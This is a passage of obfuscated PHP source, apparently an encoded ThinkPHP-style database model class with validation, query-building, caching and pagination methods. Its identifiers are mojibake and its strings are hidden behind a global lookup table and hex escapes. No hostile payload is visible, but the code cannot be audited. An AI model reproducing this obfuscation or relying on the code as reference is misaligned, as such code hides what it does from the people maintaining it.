$‘ó¦‘Èø[$ˆ¿Ãöí[0]]); } if ($Ú¢ˆ¯ëÆ[321] == $ˆ¿Ãöí[3]) { $‘ó¦‘Èø[$ˆ¿Ãöí[0]] = call_user_func_array($ˆ¿Ãöí[1], $¾½…¶ô‰); } else { $‘ó¦‘Èø[$ˆ¿Ãöí[0]] = call_user_func_array(array(&$this, $ˆ¿Ãöí[1]), $¾½…¶ô‰); } break; case $Ú¢ˆ¯ëÆ[273]: $‘ó¦‘Èø[$ˆ¿Ãöí[0]] = $‘ó¦‘Èø[$ˆ¿Ãöí[1]]; break; case $Ú¢ˆ¯ëÆ[323]: if ($Ú¢ˆ¯ëÆ[12] === $‘ó¦‘Èø[$ˆ¿Ãöí[0]]) { unset($‘ó¦‘Èø[$ˆ¿Ãöí[0]]); } break; case $Ú¢ˆ¯ëÆ[324]: default: $‘ó¦‘Èø[$ˆ¿Ãöí[0]] = $ˆ¿Ãöí[1]; } if (!1 === $‘ó¦‘Èø[$ˆ¿Ãöí[0]]) { unset($‘ó¦‘Èø[$ˆ¿Ãöí[0]]); } } } } return $‘ó¦‘Èø; } protected function autoValidation($«Å£ÓÇ‘, $‘ı»ü­‹) { $ÆÓôı÷õ =& $_SERVER[ĞÂ¤àÓï]; if (!empty($this->options[$ÆÓôı÷õ[325]])) { $†É·åœù = $this->options[$ÆÓôı÷õ[325]]; unset($this->options[$ÆÓôı÷õ[325]]); } elseif (!empty($this->_validate)) { $†É·åœù = $this->_validate; } if (isset($†É·åœù)) { if ($this->patchValidate) { $this->error = array(); } foreach ($†É·åœù as $åÆâ°Å» => $û¨ã×€¸) { if (empty($û¨ã×€¸[5]) || $û¨ã×€¸[5] == THINK_MODEL_BOTH || $û¨ã×€¸[5] == $‘ı»ü­‹) { if (0 == strpos($û¨ã×€¸[2], $ÆÓôı÷õ[326]) && strpos($û¨ã×€¸[2], $ÆÓôı÷õ[327])) { $û¨ã×€¸[2] = think_lang(substr($û¨ã×€¸[2], 2, -1)); } $û¨ã×€¸[3] = isset($û¨ã×€¸[3]) ? $û¨ã×€¸[3] : THINK_EXISTS_VALIDATE; $û¨ã×€¸[4] = isset($û¨ã×€¸[4]) ? $û¨ã×€¸[4] : $ÆÓôı÷õ[328]; switch ($û¨ã×€¸[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($«Å£ÓÇ‘, $û¨ã×€¸)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($ÆÓôı÷õ[12] != trim($«Å£ÓÇ‘[$û¨ã×€¸[0]])) { if (!1 === $this->_validationField($«Å£ÓÇ‘, $û¨ã×€¸)) { return !1; } } break; default: if (isset($«Å£ÓÇ‘[$û¨ã×€¸[0]])) { if (!1 === $this->_validationField($«Å£ÓÇ‘, $û¨ã×€¸)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($…æØ¹ö¦, $äğòÑâ²) { if (!1 === $this->_validationFieldItem($…æØ¹ö¦, $äğòÑâ²)) { if ($this->patchValidate) { $this->error[$äğòÑâ²[0]] = $äğòÑâ²[2]; } else { $this->error = $äğòÑâ²[2]; return !1; } } return; } protected function _validationFieldItem($’Íı—, $Ãµâ¨çŸ) { $Üì£ä£ =& $_SERVER[ĞÂ¤àÓï]; switch (strtolower(trim($Ãµâ¨çŸ[4]))) { case $Üì£ä£[321]: case $Üì£ä£[322]: $œ¸—÷ ö = isset($Ãµâ¨çŸ[6]) ? (array) $Ãµâ¨çŸ[6] : array(); if (is_string($Ãµâ¨çŸ[0]) && strpos($Ãµâ¨çŸ[0], $Üì£ä£[50])) { $Ãµâ¨çŸ[0] = explode($Üì£ä£[50], $Ãµâ¨çŸ[0]); } if (is_array($Ãµâ¨çŸ[0])) { foreach ($Ãµâ¨çŸ[0] as $¦Óá…˜) { $ÑÏÓ™š[$¦Óá…˜] = $’Íı—[$¦Óá…˜]; } array_unshift($œ¸—÷ ö, $ÑÏÓ™š); } else { array_unshift($œ¸—÷ ö, $’Íı—[$Ãµâ¨çŸ[0]]); } if ($Üì£ä£[321] == $Ãµâ¨çŸ[4]) { return call_user_func_array($Ãµâ¨çŸ[1], $œ¸—÷ ö); } else { return call_user_func_array(array(&$this, $Ãµâ¨çŸ[1]), $œ¸—÷ ö); } case $Üì£ä£[329]: return $’Íı—[$Ãµâ¨çŸ[0]] == $’Íı—[$Ãµâ¨çŸ[1]]; case $Üì£ä£[330]: if (is_string($Ãµâ¨çŸ[0]) && strpos($Ãµâ¨çŸ[0], $Üì£ä£[50])) { $Ãµâ¨çŸ[0] = explode($Üì£ä£[50], $Ãµâ¨çŸ[0]); } $ÅÑ‰‹¼Ä = array(); if (is_array($Ãµâ¨çŸ[0])) { foreach ($Ãµâ¨çŸ[0] as $¦Óá…˜) { $ÅÑ‰‹¼Ä[$¦Óá…˜] = $’Íı—[$¦Óá…˜]; } } else { $ÅÑ‰‹¼Ä[$Ãµâ¨çŸ[0]] = $’Íı—[$Ãµâ¨çŸ[0]]; } if (!empty($’Íı—[$this->getPk()])) { $ÅÑ‰‹¼Ä[$this->getPk()] = array($Üì£ä£[331], $’Íı—[$this->getPk()]); } if ($this->where($ÅÑ‰‹¼Ä)->find()) { return !1; } return !0; default: return $this->check($’Íı—[$Ãµâ¨çŸ[0]], $Ãµâ¨çŸ[1], $Ãµâ¨çŸ[4]); } } public function check($Õëú€Š¹, $¶ÅÑßñ, $Ş”¶„…Ù = "\x72\x65\x67\145\x78") { $œë–Ü™Ş =& $_SERVER[ĞÂ¤àÓï]; $Ş”¶„…Ù = strtolower(trim($Ş”¶„…Ù)); switch ($Ş”¶„…Ù) { case $œë–Ü™Ş[7]: case $œë–Ü™Ş[332]: $Ä³üÉö¯ = is_array($¶ÅÑßñ) ? $¶ÅÑßñ : explode($œë–Ü™Ş[50], $¶ÅÑßñ); return $Ş”¶„…Ù == $œë–Ü™Ş[7] ? in_array($Õëú€Š¹, $Ä³üÉö¯) : !in_array($Õëú€Š¹, $Ä³üÉö¯); case $œë–Ü™Ş[333]: case $œë–Ü™Ş[334]: if (is_array($¶ÅÑßñ)) { $ü¸û„³± = $¶ÅÑßñ[0]; $º©ó¸”® = $¶ÅÑßñ[1]; } else { list($ü¸û„³±, $º©ó¸”®) = explode($œë–Ü™Ş[50], $¶ÅÑßñ); } return $Ş”¶„…Ù == $œë–Ü™Ş[333] ? $Õëú€Š¹ >= $ü¸û„³± && $Õëú€Š¹ <= $º©ó¸”® : $Õëú€Š¹ < $ü¸û„³± || $Õëú€Š¹ > $º©ó¸”®; case $œë–Ü™Ş[335]: case $œë–Ü™Ş[336]: return $Ş”¶„…Ù == $œë–Ü™Ş[335] ? $Õëú€Š¹ == $¶ÅÑßñ : $Õëú€Š¹ != $¶ÅÑßñ; case $œë–Ü™Ş[337]: $Ñíæê™Õ = mb_strlen($Õëú€Š¹, $œë–Ü™Ş[338]); if (strpos($¶ÅÑßñ, $œë–Ü™Ş[50])) { list($ü¸û„³±, $º©ó¸”®) = explode($œë–Ü™Ş[50], $¶ÅÑßñ); return $Ñíæê™Õ >= $ü¸û„³± && $Ñíæê™Õ <= $º©ó¸”®; } else { return $Ñíæê™Õ == $¶ÅÑßñ; } case $œë–Ü™Ş[339]: list($õ€Ü“, $ÂÕ¤ø…) = explode($œë–Ü™Ş[50], $¶ÅÑßñ); if (!is_numeric($õ€Ü“)) { $õ€Ü“ = strtotime($õ€Ü“); } if (!is_numeric($ÂÕ¤ø…)) { $ÂÕ¤ø… = strtotime($ÂÕ¤ø…); } return NOW_TIME >= $õ€Ü“ && NOW_TIME <= $ÂÕ¤ø…; case $œë–Ü™Ş[340]: return in_array(get_client_ip(), explode($œë–Ü™Ş[50], $¶ÅÑßñ)); case $œë–Ü™Ş[341]: return !in_array(get_client_ip(), explode($œë–Ü™Ş[50], $¶ÅÑßñ)); case $œë–Ü™Ş[328]: default: return $this->regex($Õëú€Š¹, $¶ÅÑßñ); } } public function query($‚¯ˆÆ´Ó, $ÊÆ¯¬²Í = false) { $€ÂÏİ‰ =& $_SERVER[ĞÂ¤àÓï]; if (!is_bool($ÊÆ¯¬²Í) && !is_array($ÊÆ¯¬²Í)) { $ÊÆ¯¬²Í = func_get_args(); array_shift($ÊÆ¯¬²Í); } $‚¯ˆÆ´Ó = str_replace(array($€ÂÏİ‰[231], $€ÂÏİ‰[342]), $€ÂÏİ‰[53], $‚¯ˆÆ´Ó); $‚¯ˆÆ´Ó = $this->parseSql($‚¯ˆÆ´Ó, $ÊÆ¯¬²Í); return $this->db->query($‚¯ˆÆ´Ó); } public function execute($ù‘¶’›ƒ, $ŒôøíÉ = false) { if (!is_bool($ŒôøíÉ) && !is_array($ŒôøíÉ)) { $ŒôøíÉ = func_get_args(); array_shift($ŒôøíÉ); } $ù‘¶’›ƒ = $this->parseSql($ù‘¶’›ƒ, $ŒôøíÉ); return $this->db->execute($ù‘¶’›ƒ); } protected function parseSql($ÄÈÆÉ”¥, $¾ñÉÚé) { $¨½Œù÷ =& $_SERVER[ĞÂ¤àÓï]; if (!0 === $¾ñÉÚé) { $ÏÚÉ¦øš = $this->_parseOptions(); $ÄÈÆÉ”¥ = $this->db->parseSql($ÄÈÆÉ”¥, $ÏÚÉ¦øš); } elseif (is_array($¾ñÉÚé)) { $¾ñÉÚé = array_map(array($this->db, $¨½Œù÷[343]), $¾ñÉÚé); $ÄÈÆÉ”¥ = vsprintf($ÄÈÆÉ”¥, $¾ñÉÚé); } else { $ÄÈÆÉ”¥ = strtr($ÄÈÆÉ”¥, array($¨½Œù÷[344] => $this->getTableName(), $¨½Œù÷[345] => think_config($¨½Œù÷[244]))); } $this->db->setModel($this->name); return $ÄÈÆÉ”¥; } public function db($Ãí…¨ä¦ = '', $ş”¸÷Ø = '', $›Àó‘â¤ = array()) { $îÄÖÈ¹„ =& $_SERVER[ĞÂ¤àÓï]; if ($îÄÖÈ¹„[12] === $Ãí…¨ä¦ && $this->db) { return $this->db; } static $©¥úé‹€ = array(); static $ùÌÁîÚõ = array(); if (!isset($ùÌÁîÚõ[$Ãí…¨ä¦]) || isset($ùÌÁîÚõ[$Ãí…¨ä¦]) && $ş”¸÷Ø && $©¥úé‹€[$Ãí…¨ä¦] != $ş”¸÷Ø) { if (!empty($ş”¸÷Ø) && is_string($ş”¸÷Ø) && !1 === strpos($ş”¸÷Ø, $îÄÖÈ¹„[8])) { $ş”¸÷Ø = think_config($ş”¸÷Ø); } $Ãí…¨ä¦ = think_guid($ş”¸÷Ø); $ùÌÁîÚõ[$Ãí…¨ä¦] = Db::getInstance($ş”¸÷Ø); } elseif (NULL === $ş”¸÷Ø) { $ùÌÁîÚõ[$Ãí…¨ä¦]->close(); unset($ùÌÁîÚõ[$Ãí…¨ä¦]); return; } if (!empty($›Àó‘â¤)) { if (is_string($›Àó‘â¤)) { parse_str($›Àó‘â¤, $›Àó‘â¤); } foreach ($›Àó‘â¤ as $÷·ÕÅ¥İ => $†ÃÙÁÎş) { $this->setProperty($÷·ÕÅ¥İ, $†ÃÙÁÎş); } } $©¥úé‹€[$Ãí…¨ä¦] = $ş”¸÷Ø; $this->db = $ùÌÁîÚõ[$Ãí…¨ä¦]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $Š¾ÁÒœ– = get_class($this); if ($Š¾ÁÒœ– == $_SERVER[ĞÂ¤àÓï][346]) { return $this->name; } $this->name = substr($Š¾ÁÒœ–, 0, -5); } return $this->name; } public function getTableName() { $°û§ğÕ =& $_SERVER[ĞÂ¤àÓï]; if (empty($this->trueTableName)) { $šŠ›–¸Ã = !empty($this->tablePrefix) ? $this->tablePrefix : $°û§ğÕ[12]; if (!empty($this->tableName)) { $šŠ›–¸Ã .= $this->tableName; } else { $šŠ›–¸Ã .= think_parse_name($this->name); } $this->trueTableName = strtolower($šŠ›–¸Ã); } return (!empty($this->dbName) ? $this->dbName . $°û§ğÕ[10] : $°û§ğÕ[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $ñô¢ùÓ =& $_SERVER[ĞÂ¤àÓï]; return isset($this->fields[$ñô¢ùÓ[251]]) ? $this->fields[$ñô¢ùÓ[251]] : $this->pk; } public function getDbFields() { $ÅµßÊÙş =& $_SERVER[ĞÂ¤àÓï]; if (isset($this->options[$ÅµßÊÙş[279]])) { $ºı«º“ = $this->db->getFields($this->options[$ÅµßÊÙş[279]]); return $ºı«º“ ? array_keys($ºı«º“) : !1; } if ($this->fields) { $ºı«º“ = $this->fields; unset($ºı«º“[$ÅµßÊÙş[250]], $ºı«º“[$ÅµßÊÙş[251]], $ºı«º“[$ÅµßÊÙş[252]], $ºı«º“[$ÅµßÊÙş[249]]); return $ºı«º“; } return !1; } public function data($úèƒúÜ = '') { $¶ã¨íğÌ =& $_SERVER[ĞÂ¤àÓï]; if ($¶ã¨íğÌ[12] === $úèƒúÜ && !empty($this->data)) { return $this->data; } if (is_object($úèƒúÜ)) { $úèƒúÜ = get_object_vars($úèƒúÜ); } elseif (is_string($úèƒúÜ)) { parse_str($úèƒúÜ, $úèƒúÜ); } elseif (!is_array($úèƒúÜ)) { think_exception(think_lang($¶ã¨íğÌ[271])); } $this->data = $úèƒúÜ; return $this; } public function join($óóøÕÒÓ) { $Ï›Œ¯÷ =& $_SERVER[ĞÂ¤àÓï]; if (is_array($óóøÕÒÓ)) { $this->options[$Ï›Œ¯÷[282]] = $óóøÕÒÓ; } elseif (!empty($óóøÕÒÓ)) { $this->options[$Ï›Œ¯÷[282]][] = $óóøÕÒÓ; } return $this; } public function union($§ôìú§Ÿ, $®Ú°÷óö = false) { $½ÛÀ›éÔ =& $_SERVER[ĞÂ¤àÓï]; if (empty($§ôìú§Ÿ)) { return $this; } if ($®Ú°÷óö) { $this->options[$½ÛÀ›éÔ[347]][$½ÛÀ›éÔ[348]] = !0; } if (is_object($§ôìú§Ÿ)) { $§ôìú§Ÿ = get_object_vars($§ôìú§Ÿ); } if (is_string($§ôìú§Ÿ)) { $‰ó–ƒìø = $§ôìú§Ÿ; } elseif (is_array($§ôìú§Ÿ)) { if (isset($§ôìú§Ÿ[0])) { $this->options[$½ÛÀ›éÔ[347]] = array_merge($this->options[$½ÛÀ›éÔ[347]], $§ôìú§Ÿ); return $this; } else { $‰ó–ƒìø = $§ôìú§Ÿ; } } else { think_exception(think_lang($½ÛÀ›éÔ[271])); } $this->options[$½ÛÀ›éÔ[347]][] = $‰ó–ƒìø; return $this; } public function cache($Ä—üÙ„› = true, $‘›Ğ« = null, $­á½ÈÅ© = '') { $—§İ›ØÖ =& $_SERVER[ĞÂ¤àÓï]; if (!1 !== $Ä—üÙ„›) { $this->options[$—§İ›ØÖ[349]] = array($—§İ›ØÖ[94] => $Ä—üÙ„›, $—§İ›ØÖ[339] => $‘›Ğ«, $—§İ›ØÖ[33] => $­á½ÈÅ©); } return $this; } public function field($ÓšÙ¸âê, $Õ¦òßñ‘ = false) { $³ÅƒÛ›ß =& $_SERVER[ĞÂ¤àÓï]; if (!0 === $ÓšÙ¸âê) { $‹ë¬ë¼ = $this->getDbFields(); $ÓšÙ¸âê = $‹ë¬ë¼ ? $‹ë¬ë¼ : $³ÅƒÛ›ß[188]; } elseif ($Õ¦òßñ‘) { if (is_string($ÓšÙ¸âê)) { $ÓšÙ¸âê = explode($³ÅƒÛ›ß[50], $ÓšÙ¸âê); } $‹ë¬ë¼ = $this->getDbFields(); $ÓšÙ¸âê = $‹ë¬ë¼ ? array_diff($‹ë¬ë¼, $ÓšÙ¸âê) : $ÓšÙ¸âê; } $this->options[$³ÅƒÛ›ß[273]] = $ÓšÙ¸âê; return $this; } public function scope($ÛçÉ¼ùï = '', $ŸœÖøÁ = NULL) { $Š¶øÆŸ =& $_SERVER[ĞÂ¤àÓï]; if ($Š¶øÆŸ[12] === $ÛçÉ¼ùï) { if (isset($this->_scope[$Š¶øÆŸ[37]])) { $Ùú¡¦£÷ = $this->_scope[$Š¶øÆŸ[37]]; } else { return $this; } } elseif (is_string($ÛçÉ¼ùï)) { $¤Æó™± = explode($Š¶øÆŸ[50], $ÛçÉ¼ùï); $Ùú¡¦£÷ = array(); foreach ($¤Æó™± as $Ê±¸îî¾) { if (!isset($this->_scope[$Ê±¸îî¾])) { continue; } $Ùú¡¦£÷ = array_merge($Ùú¡¦£÷, $this->_scope[$Ê±¸îî¾]); } if (!empty($ŸœÖøÁ) && is_array($ŸœÖøÁ)) { $Ùú¡¦£÷ = array_merge($Ùú¡¦£÷, $ŸœÖøÁ); } } elseif (is_array($ÛçÉ¼ùï)) { $Ùú¡¦£÷ = $ÛçÉ¼ùï; } if (is_array($Ùú¡¦£÷) && !empty($Ùú¡¦£÷)) { $this->options = array_merge($this->options, array_change_key_case($Ùú¡¦£÷)); } return $this; } public function where($Ù óºÄ, $¹•Íß¦ = null) { $¤÷İÕúì =& $_SERVER[ĞÂ¤àÓï]; if (!is_null($¹•Íß¦) && is_string($Ù óºÄ)) { if (!is_array($¹•Íß¦)) { $¹•Íß¦ = func_get_args(); array_shift($¹•Íß¦); } $¹•Íß¦ = array_map(array($this->db, $¤÷İÕúì[343]), $¹•Íß¦); $Ù óºÄ = vsprintf($Ù óºÄ, $¹•Íß¦); } elseif (is_object($Ù óºÄ)) { $Ù óºÄ = get_object_vars($Ù óºÄ); } elseif (is_array($Ù óºÄ)) { foreach ($Ù óºÄ as $Èúè¯ß´ => $Å×é»€ç) { if ((is_numeric($Èúè¯ß´) || !$Èúè¯ß´) && is_string($Å×é»€ç)) { if (strpos($Å×é»€ç, $¤÷İÕúì[350]) === 0) { continue; } think_trace($¤÷İÕúì[351], $¤÷İÕúì[12], $¤÷İÕúì[49]); die; } } } if (is_string($Ù óºÄ) && $¤÷İÕúì[12] != $Ù óºÄ) { $ã™¦‹ô = array(); $ã™¦‹ô[$¤÷İÕúì[352]] = $Ù óºÄ; $Ù óºÄ = $ã™¦‹ô; } if (isset($this->options[$¤÷İÕúì[275]])) { $this->options[$¤÷İÕúì[275]] = array_merge($this->options[$¤÷İÕúì[275]], $Ù óºÄ); } else { $this->options[$¤÷İÕúì[275]] = $Ù óºÄ; } return $this; } public function limit($éßÈÁŒŠ, $ÁŠôƒ”° = null) { $É²ÎÂÊì =& $_SERVER[ĞÂ¤àÓï]; $this->options[$É²ÎÂÊì[292]] = is_null($ÁŠôƒ”°) ? $éßÈÁŒŠ : $éßÈÁŒŠ . $É²ÎÂÊì[50] . $ÁŠôƒ”°; return $this; } public function page($’¶ğÅŠ¹, $ñÕğ‡£« = null) { $•ñåÃÚü =& $_SERVER[ĞÂ¤àÓï]; $this->options[$•ñåÃÚü[353]] = is_null($ñÕğ‡£«) ? $’¶ğÅŠ¹ : $’¶ğÅŠ¹ . $•ñåÃÚü[50] . $ñÕğ‡£«; return $this; } public function comment($¿¬ñİ¿«) { $this->options[$_SERVER[ĞÂ¤àÓï][354]] = $¿¬ñİ¿«; return $this; } public function setProperty($¿¶±Ş‚, $…”«) { if (property_exists($this, $¿¶±Ş‚)) { $this->{$¿¶±Ş‚} = $…”«; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\x6f\x64\x69\146\x79\124\x69\x6d\x65", "\x74\151\x6d\145", "\151\x6e\x73\x65\x72\164\54\x75\x70\144\141\x74\145", "\x66\165\x6e\143\x74\151\x6f\156"), array("\x63\x72\145\141\x74\x65\124\151\155\145", "\164\151\155\145", "\151\x6e\x73\145\x72\x74", "\x66\x75\156\x63\x74\151\157\156")); public function setDataAuto($œºŸäË») { $this->dataAuto = $œºŸäË»; } public function __construct($ù´ˆÁúâ = '', $³Ì›«»’ = '', $Ÿå³ØĞ = '') { parent::__construct($ù´ˆÁúâ, $³Ì›«»’, $Ÿå³ØĞ); } protected $tableMeta = array(); protected function _beforeInsert(&$ôğ–ı¯”, $ôĞêô¤ì) { $¯Áëóµû =& $_SERVER[ĞÂ¤àÓï]; if (!$this->checkDataAutoHas($¯Áëóµû[355])) { return; } $this->dataBeforeFilter($ôğ–ı¯”, $¯Áëóµû[355]); } protected function _beforeUpdate(&$ àÛª¦Ù, $«ıº¹¹Æ) { $°ï‰¬¥î =& $_SERVER[ĞÂ¤àÓï]; if (!$this->checkDataAutoHas($°ï‰¬¥î[356])) { return; } $this->dataBeforeFilter($ àÛª¦Ù, $°ï‰¬¥î[356]); } protected function _afterSelect(&$‘§Ñ¾¹Ò, $êÀ­µ£°) { if (!is_array($‘§Ñ¾¹Ò)) { return; } if (!$this->checkDataAutoHas($_SERVER[ĞÂ¤àÓï][357])) { return; } foreach ($‘§Ñ¾¹Ò as &$¨É«À¹ó) { $this->dataAfterFilter($¨É«À¹ó); } unset($¨É«À¹ó); } protected function _afterFind(&$·ª¿†“, $á“¾×ÙŒ) { if (!is_array($·ª¿†“)) { return; } if (!$this->checkDataAutoHas($_SERVER[ĞÂ¤àÓï][357])) { return; } $this->dataAfterFilter($·ª¿†“); } public static function textEncode($ƒ‹ÙÈ¥¹) { if (!$ƒ‹ÙÈ¥¹) { return $ƒ‹ÙÈ¥¹; } $ËøîÛ’ = json_encode($ƒ‹ÙÈ¥¹); $ËøîÛ’ = preg_replace_callback($_SERVER[ĞÂ¤àÓï][358], function ($¿îÜòÇû) { return addslashes($¿îÜòÇû[0]); }, $ËøîÛ’); return json_decode($ËøîÛ’); } public static function textDecode($°ªéñ¬ğ) { $˜½³âõğ =& $_SERVER[ĞÂ¤àÓï]; $¸ÚËŠâ† = json_encode($°ªéñ¬ğ); $¸ÚËŠâ† = preg_replace_callback($˜½³âõğ[359], function ($åíÁÌ”Ë) { return $_SERVER[ĞÂ¤àÓï][97]; }, $¸ÚËŠâ†); return json_decode($¸ÚËŠâ†); } public function setAutoIncrement($Úü•œ“Ò) { $á÷Ñ–‰Ï = array($this->getPk() => $Úü•œ“Ò); $²‹ªĞ„Š = $this->data($á÷Ñ–‰Ï)->add(); if ($²‹ªĞ„Š) { $this->delete($²‹ªĞ„Š); } } public function getAutoIncrement() { $’Úú®Æª = $this->getTableName(); $Åş´İôË = $this->max($this->getPk()); $ÌÕëş = $this->query("\x73\150\x6f\167\40\164\141\x62\x6c\145\x20\163\x74\x61\164\165\163\x20\167\x68\145\162\145\40\x4e\141\x6d\145\x3d\x27{$’Úú®Æª}\47"); $×øñÈ¯ = $ÌÕëş[0][$_SERVER[ĞÂ¤àÓï][360]]; $Å¥€–¬ = max($Åş´İôË, $×øñÈ¯); return $Å¥€–¬; } protected function _callBefore($²‘¾ÌÃ¡, $©§»ïöÕ) { return $this->cacheCallCheck($²‘¾ÌÃ¡, $©§»ïöÕ, !1); } protected function _callAfter($ş€ìÔáï, $„ïÇƒÊÌ) { return $this->cacheCallCheck($ş€ìÔáï, $„ïÇƒÊÌ, !0); } protected function cacheFunctionAlias($¾×™¼“È) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($Û¦ƒ ‹½, $¤‹—ŠÁ¥, $´Ş‚øø = false) { $°âª›Â = $this->cacheFunctionAlias($¤‹—ŠÁ¥); if (!$°âª›Â) { return; } foreach ($°âª›Â as $Ä¾Ç’ºû => $»ÜÅ»è) { $‚ƒàÒï¶ = $»ÜÅ»è[0]; $óóø“±… = explode($_SERVER[ĞÂ¤àÓï][50], $»ÜÅ»è[1]); if ($Û¦ƒ ‹½ == $Ä¾Ç’ºû) { return $this->cacheFunctionGet($Ä¾Ç’ºû, $‚ƒàÒï¶); } if ($´Ş‚øø && in_array($Û¦ƒ ‹½, $óóø“±…)) { $this->cacheFunctionClear($Ä¾Ç’ºû, $‚ƒàÒï¶); } } } public function cacheFunctionGet($åÃ‹ÀŸå, $•¢âÇ­Ä) { $Ü¹š®š = $this->cacheKeyMake($åÃ‹ÀŸå, $•¢âÇ­Ä); $ŸÇ§ŸßÏ = Cache::get($Ü¹š®š); if (!is_array($ŸÇ§ŸßÏ)) { $ŸÇ§ŸßÏ = call_user_func_array(array($this, $åÃ‹ÀŸå), array($•¢âÇ­Ä, !0)); Cache::set($Ü¹š®š, $ŸÇ§ŸßÏ); } return $ŸÇ§ŸßÏ; } public function cacheFunctionClear($Ğ‚«Ù—, $¸®Ãå—Ù) { $«‡®ığ³ = $¸®Ãå—Ù; if (!is_array($¸®Ãå—Ù)) { $«‡®ığ³ = array($¸®Ãå—Ù); } foreach ($«‡®ığ³ as $¯ŒáÅ«Ë) { $¯ì¤Ï‰í = $this->cacheKeyMake($Ğ‚«Ù—, $¯ŒáÅ«Ë); Cache::remove($¯ì¤Ï‰í); } } private function cacheKeyMake($ƒï°Ö¼ƒ, $ıÑâËõ›) { $¼ÉôÉá =& $_SERVER[ĞÂ¤àÓï]; return get_class($this) . $¼ÉôÉá[11] . $ƒï°Ö¼ƒ . $¼ÉôÉá[361] . $ıÑâËõ›; } protected function selectPageReset() { $×ÚÉ»†ì =& $_SERVER[ĞÂ¤àÓï]; if (isset($GLOBALS[$×ÚÉ»†ì[362]])) { return; } $GLOBALS[$×ÚÉ»†ì[362]] = isset($GLOBALS[$×ÚÉ»†ì[7]][$×ÚÉ»†ì[363]]) ? $GLOBALS[$×ÚÉ»†ì[7]][$×ÚÉ»†ì[363]] : !1; $GLOBALS[$×ÚÉ»†ì[364]] = isset($GLOBALS[$×ÚÉ»†ì[7]][$×ÚÉ»†ì[353]]) ? $GLOBALS[$×ÚÉ»†ì[7]][$×ÚÉ»†ì[353]] : !1; $GLOBALS[$×ÚÉ»†ì[7]][$×ÚÉ»†ì[363]] = !1; $GLOBALS[$×ÚÉ»†ì[7]][$×ÚÉ»†ì[353]] = !1; } protected function selectPageRestore() { $Ç¨óêŞ =& $_SERVER[ĞÂ¤àÓï]; if (!isset($GLOBALS[$Ç¨óêŞ[362]])) { return; } $GLOBALS[$Ç¨óêŞ[7]][$Ç¨óêŞ[363]] = $GLOBALS[$Ç¨óêŞ[362]]; $GLOBALS[$Ç¨óêŞ[7]][$Ç¨óêŞ[353]] = $GLOBALS[$Ç¨óêŞ[364]]; if ($GLOBALS[$Ç¨óêŞ[7]][$Ç¨óêŞ[363]] === !1) { unset($GLOBALS[$Ç¨óêŞ[7]][$Ç¨óêŞ[363]]); } if ($GLOBALS[$Ç¨óêŞ[7]][$Ç¨óêŞ[353]] === !1) { unset($GLOBALS[$Ç¨óêŞ[7]][$Ç¨óêŞ[353]]); } unset($GLOBALS[$Ç¨óêŞ[362]]); unset($GLOBALS[$Ç¨óêŞ[364]]); } protected function selectPage($İ‚šìŸ­ = 200, $Íƒü•£ = 1) { $™ÅÀœ =& $_SERVER[ĞÂ¤àÓï]; global $in; $ôÇ©ñ™á = $this->optionsValue(); $šŠÍ®öØ = 50000; $İ‚šìŸ­ = isset($in[$™ÅÀœ[363]]) && $in[$™ÅÀœ[363]] ? $in[$™ÅÀœ[363]] : $İ‚šìŸ­; if ($İ‚šìŸ­ === -1) { $in[$™ÅÀœ[363]] = !1; $šŠÍ®öØ = 100000000; $İ‚šìŸ­ = $šŠÍ®öØ; } $¹öâˆ¿ş = $ôÇ©ñ™á; $¹öâˆ¿ş[$™ÅÀœ[365]] = array(); $İ‚šìŸ­ = intval($İ‚šìŸ­); $İ‚šìŸ­ = $İ‚šìŸ­ <= 5 ? 5 : ($İ‚šìŸ­ >= $šŠÍ®öØ ? $šŠÍ®öØ : $İ‚šìŸ­); $Íƒü•£ = intval(isset($in[$™ÅÀœ[353]]) && $in[$™ÅÀœ[353]] ? $in[$™ÅÀœ[353]] : $Íƒü•£); $Íƒü•£ = $Íƒü•£ <= 1 ? 1 : $Íƒü•£; $Ñ€Æ¸°Ø = array(); $ šıô‰È = 1; if ($Íƒü•£ == 1 && $ šıô‰È) { $this->optionsValue($ôÇ©ñ™á); $Ñ€Æ¸°Ø = $this->page($Íƒü•£, $İ‚šìŸ­)->select(); $éˆºá = is_array($Ñ€Æ¸°Ø) ? count($Ñ€Æ¸°Ø) : 0; if ($éˆºá < $İ‚šìŸ­) { $Á±ïÒç· = 1; } else { $this->optionsValue($¹öâˆ¿ş); $éˆºá = intval($this->count()); $Á±ïÒç· = ceil($éˆºá / $İ‚šìŸ­); } } else { $this->optionsValue($¹öâˆ¿ş); $éˆºá = intval($this->count()); $Á±ïÒç· = ceil($éˆºá / $İ‚šìŸ­); $Íƒü•£ = $Íƒü•£ >= $Á±ïÒç· ? $Á±ïÒç· : $Íƒü•£; $this->optionsValue($ôÇ©ñ™á); $Ñ€Æ¸°Ø = $this->page($Íƒü•£, $İ‚šìŸ­)->select(); } if (!is_array($Ñ€Æ¸°Ø)) { $Ñ€Æ¸°Ø = array(); } if ($Á±ïÒç· == 1) { $éˆºá = count($Ñ€Æ¸°Ø); } $Ï†¶ëşı = array($™ÅÀœ[366] => array($™ÅÀœ[367] => $éˆºá, $™ÅÀœ[363] => $İ‚šìŸ­, $™ÅÀœ[353] => $Íƒü•£, $™ÅÀœ[368] => $Á±ïÒç·), $™ÅÀœ[369] => $Ñ€Æ¸°Ø); return $Ï†¶ëşı; } protected function checkLength($Ûş´»”¸, $Èä™ƒµ² = 0, $›¸¢×·ü = '') { $Šï¾šˆô =& $_SERVER[ĞÂ¤àÓï]; $Èä™ƒµ² = $Èä™ƒµ² ? $Èä™ƒµ² : 65536; if (!$Ûş´»”¸ || strlen($Ûş´»”¸) < $Èä™ƒµ²) { return; } $›¸¢×·ü = $›¸¢×·ü 